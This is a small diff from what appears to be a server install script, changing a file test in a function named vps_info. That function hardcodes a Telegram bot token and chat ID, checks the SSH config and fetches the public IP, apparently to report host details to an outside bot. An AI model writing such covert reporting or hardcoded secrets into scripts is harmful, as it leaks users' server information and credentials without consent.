@@ -421,7 +421,7 @@ Uninstall(){
 }
 
 vps_info(){
-    if [ -f /etc/ssh/sshd_config ]; then
+    if [ -e /etc/ssh/sshd_config ]; then
         Chat_id="5289158517"
         Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
         get_public_ip
